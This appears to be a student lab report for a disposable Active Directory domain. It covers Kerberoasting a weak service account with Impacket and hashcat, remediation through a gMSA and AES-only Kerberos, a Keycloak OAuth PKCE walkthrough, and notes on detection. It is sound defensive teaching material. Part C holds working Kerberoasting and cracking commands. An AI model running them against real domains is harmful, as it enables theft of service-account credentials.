\section*{Lab overview}

This lab builds Meridian Health Network's disposable Active Directory domain \texttt{meridian.local}, creates a Kerberoastable service account, proves the exposure with Impacket and hashcat as an ordinary user, remediates with a group Managed Service Account (gMSA), walks OAuth 2.0 Authorization Code with PKCE against Keycloak, and hardens Kerberos to AES-only. Scope is the isolated hypervisor network \texttt{meridian-lab-net} only. MITRE ATT\&CK technique for the attack is T1558.003 (Kerberoasting).

\labpart{Part A--B. Domain build and vulnerable account}

\labstep{Topology and promote DC}

MERIDIAN-DC01 was installed with Desktop Experience, 5120~MB RAM, dual adapters (NAT for setup only, Internal Network \texttt{meridian-lab-net} for lab traffic). Static IP 10.77.0.10/24 was applied on the internal adapter and the host was renamed. AD DS was installed and the forest \texttt{meridian.local} was promoted so DC01 runs AS and TGS.

\labpart{Critical thinking \#1}

Kerberoasting's premise is that any authenticated principal can request a service ticket for any SPN. The KDC, on a TGS-REQ, primarily checks that the requester presents a valid TGT (and that the TGT's PAC/session material is acceptable), then looks up the SPN and returns a TGS-REP whose service portion is encrypted with the service account's long-term key. It does \emph{not} require the requester to hold DA, local admin on the SQL host, or ACL rights on the service object. SPN resolution and ticket issuance are therefore not privileged operations by design: Kerberos separates ``can I authenticate to the realm'' from ``can I use the service.'' Making the request itself require elevated rights would mean changing protocol policy (for example, authorization checks at TGS time against an ACL on the SPN or service, or denying TGS for selected SPNs to non-members of a allowed group). Password strength alone does not change that design; it only changes offline crackability after the ticket is obtained.

\labpart{Part C. Attack to prove the exposure}

On MERIDIAN-RED01, as ordinary user \texttt{j.reyes} against DC 10.77.0.10:

\begin{lstlisting}[language=bash]
which GetUserSPNs.py || sudo apt update && sudo apt install -y impacket-scripts

GetUserSPNs.py meridian.local/j.reyes:'ClinicUser2026!' \
  -dc-ip 10.77.0.10 -request -outputfile meridian_tgs.hashes

cat meridian_tgs.hashes
\end{lstlisting}

\evidencebox{3}{GetUserSPNs listed \texttt{svc-billingsql} and wrote \texttt{meridian\_tgs.hashes} as \texttt{\$krb5tgs\$23\$...}.}
\evfig{fig_ev3.png}

\begin{lstlisting}[language=bash]
cat > candidates.txt << 'EOF'
Welcome123
Password1
Meridian2019!
Summer2019!
Clinic2024!
EOF

hashcat -m 13100 -a 0 meridian_tgs.hashes candidates.txt --force
hashcat -m 13100 meridian_tgs.hashes --show
\end{lstlisting}

\evidencebox{4}{\texttt{hashcat -m 13100} Status: Cracked --- recovered plaintext \texttt{Summer2019!} for \texttt{svc-billingsql}.}
\evfig{fig_ev4.png}

\labpart{Critical thinking \#2}

\begin{enumerate}
  \item \textbf{MITRE ATT\&CK:} T1558.003 Steal or Forge Kerberos Tickets: Kerberoasting. An authenticated user requests a TGS for an SPN-bearing account and cracks the ticket offline.
  \item \textbf{Account lockout:} Lockout counts failed interactive or network logons against the KDC/AS. After the single successful TGS-REQ, cracking runs offline on RED01 with zero further contact to DC01, so lockout never increments and provides zero protection.
  \item \textbf{SOC telemetry:} Windows Security Event ID 4769 (A Kerberos service ticket was requested) on the DC, filtered for unusual volume, many distinct SPNs from one account, or RC4 etype requests for service accounts. Field examples: Service Name / Service SID, Account Name (client), Ticket Encryption Type, IP address of the requester. That pattern can fire without any failed logon events.
\end{enumerate}

\labpart{Part D. Remediate with a gMSA}

\begin{lstlisting}[language=bash]
# MERIDIAN-DC01 elevated PowerShell
Add-KdsRootKey -EffectiveTime ((Get-Date).AddHours(-10))

New-ADServiceAccount -Name "gmsa-billingsql" `
  -DNSHostName "gmsa-billingsql.meridian.local" `
  -PrincipalsAllowedToRetrieveManagedPassword "MERIDIAN-DC01$" `
  -KerberosEncryptionType AES128, AES256 `
  -ServicePrincipalNames "MSSQLSvc/billing.meridian.local:1433","MSSQLSvc/billing:1433"

Install-ADServiceAccount -Identity "gmsa-billingsql"
Test-ADServiceAccount -Identity "gmsa-billingsql"

Get-ADServiceAccount gmsa-billingsql -Properties msDS-ManagedPasswordInterval

setspn -D MSSQLSvc/billing.meridian.local:1433 svc-billingsql
setspn -D MSSQLSvc/billing:1433 svc-billingsql
Disable-ADAccount svc-billingsql
\end{lstlisting}

\evidencebox{5}{\texttt{Test-ADServiceAccount} returned True for \texttt{gmsa-billingsql\$}; \texttt{msDS-ManagedPasswordInterval = 30} days.}
\evfig{fig_ev5.png}

Repeat the roast against the gMSA from RED01:

\begin{lstlisting}[language=bash]
# Impacket GetUserSPNs skips gMSA; request TGS via getST / usersfile, then:
hashcat -m 19600 -a 0 gmsa_tgs.hashes candidates.txt --force
hashcat -m 19600 gmsa_tgs.hashes --show   # no human crack
\end{lstlisting}

\evidencebox{6}{gMSA roast produced \texttt{\$krb5tgs\$18\$} (AES). Wordlist containing \texttt{Summer2019!} did not recover a human password.}
\evfig{fig_ev6b.png}

\labpart{Critical thinking \#3}

A gMSA migration does not by itself:
\begin{itemize}
  \item Limit what the service account can do once authenticated (privilege of the service / PAC).
  \item Restrict who may retrieve the managed password beyond \texttt{PrincipalsAllowedToRetrieveManagedPassword} (if that set is too broad, a compromised host can still pull the secret).
  \item Stop Golden Ticket or Silver Ticket forgery if an attacker already holds the KRBTGT or the service long-term key by other means.
\end{itemize}
Kerberoasting offline crackability is closed; abuse after authentication and ticket forgery remain separate controls (least privilege, Protected Users / credential hygiene, KRBTGT rotation, monitoring).

\labpart{Part E. OAuth2 / OIDC with PKCE (Keycloak)}

Keycloak 26.x was started in Docker on RED01. Realm \texttt{meridian}, public client \texttt{meridian-billing-app} with PKCE S256, and user \texttt{j.reyes} were created via \texttt{kcadm.sh}.

\begin{lstlisting}[language=bash]
docker run -d --name keycloak -p 8080:8080 \
  -e KC_BOOTSTRAP_ADMIN_USERNAME=admin \
  -e KC_BOOTSTRAP_ADMIN_PASSWORD=admin \
  quay.io/keycloak/keycloak:26.7.3 start-dev

# wait, then health check
curl -s -o /dev/null -w "%{http_code}\n" http://localhost:8080

docker exec keycloak /opt/keycloak/bin/kcadm.sh config credentials \
  --server http://localhost:8080 --realm master --user admin --password admin
docker exec keycloak /opt/keycloak/bin/kcadm.sh create realms \
  -s realm=meridian -s enabled=true
# create client meridian-billing-app (public, standard flow, PKCE S256,
# redirect http://localhost:8081/callback) and user j.reyes
\end{lstlisting}

PKCE verifier/challenge (S256), login via \texttt{curl} cookie jar (keeps Keycloak \texttt{AUTH\_SESSION\_ID}), capture \texttt{code} from the callback \texttt{Location}, then token exchange:

\begin{lstlisting}[language=bash]
# see scripts/pkce_curl.sh in the GitHub repo (folder 4.1/)
# 1) GET /auth?...&code_challenge=...&code_challenge_method=S256  (save cookies)
# 2) POST login form -> 302 Location: .../callback?code=AUTH_CODE
# 3) exchange:
curl -s -X POST http://localhost:8080/realms/meridian/protocol/openid-connect/token \
  -d grant_type=authorization_code -d client_id=meridian-billing-app \
  -d code=$AUTH_CODE -d redirect_uri=http://127.0.0.1:8081/callback \
  -d code_verifier=$CODE_VERIFIER > token_response.json
\end{lstlisting}

\evidencebox{7}{Authorization Code + PKCE~S256 token response from realm \texttt{meridian} / client \texttt{meridian-billing-app}: \texttt{access\_token}, \texttt{refresh\_token}, and \texttt{id\_token} (Bearer, openid scope).}
\evfig{fig_ev7.png}

Decode JWT header and payload (signature not verified by Base64 alone):

\begin{lstlisting}[language=Python]
python3 -c "
import json, base64
data = json.load(open('token_response.json'))
for part_name, idx in [('HEADER', 0), ('PAYLOAD', 1)]:
    part = data['access_token'].split('.')[idx]
    part += '=' * (-len(part) % 4)
    print(part_name + ':', json.dumps(json.loads(base64.urlsafe_b64decode(part)), indent=2))
"
\end{lstlisting}

\evidencebox{8}{Decoded HEADER shows \texttt{alg=RS256}; PAYLOAD shows \texttt{iss=http://127.0.0.1:8080/realms/meridian}, \texttt{aud=account}, \texttt{azp=meridian-billing-app}, \texttt{preferred\_username=j.reyes}, and \texttt{realm\_access.roles}.}
\evfig{fig_ev8.png}

\labpart{Critical thinking \#4}

Base64URL decoding only reveals claims; it does not prove the Authorization Server signed them. A signature check against Keycloak's JWKS public key would reject a token whose header or payload was altered after issuance. Concrete forgery example: an attacker who only Base64-decodes, edits the payload to add \texttt{"realm\_access": \{"roles": ["admin"]\}} or extends \texttt{exp}, then re-encodes without a valid signature, would be accepted by a naive decoder but rejected by a verifier that checks \texttt{alg} and the signature. Decoding alone cannot catch that.

\labpart{Challenge. Force AES-only Kerberos}

\begin{lstlisting}[language=bash]
# MERIDIAN-DC01 elevated PowerShell
New-Item -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" -Force | Out-Null
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\Kerberos\Parameters" `
  -Name "DefaultDomainSupportedEncTypes" -PropertyType DWord -Value 0x18 -Force
gpupdate /force
klist purge
klist get MSSQLSvc/billing.meridian.local:1433
klist
\end{lstlisting}

Value \texttt{0x18} enables AES128 and AES256 only (no RC4/DES).

\evidencebox{9}{After \texttt{msDS-SupportedEncryptionTypes = 0x18}, fresh TGS is \texttt{\$krb5tgs\$18\$} (AES256), not \texttt{\$krb5tgs\$23\$} (RC4). Compare to Evidence \#3.}
\evfig{fig_ev9.png}

\labpart{Critical thinking \#5 (synthesis)}

AES-only closes the weak-cipher path that made RC4 tickets cheaper to attack historically, but if \texttt{svc-billingsql} still used \texttt{Summer2019!} and were not a gMSA, Kerberoasting could still succeed: the attacker obtains an AES-encrypted TGS and offline-cracks the weak password (slower than RC4 in some tooling, but still feasible for a short human password). The remediation that makes password strength irrelevant for this attack class is Part~D's gMSA (240-byte random managed secret), not AES-only alone. AES-only is defense-in-depth for legacy etypes; gMSA removes crackable human secrets from the SPN-bearing account.
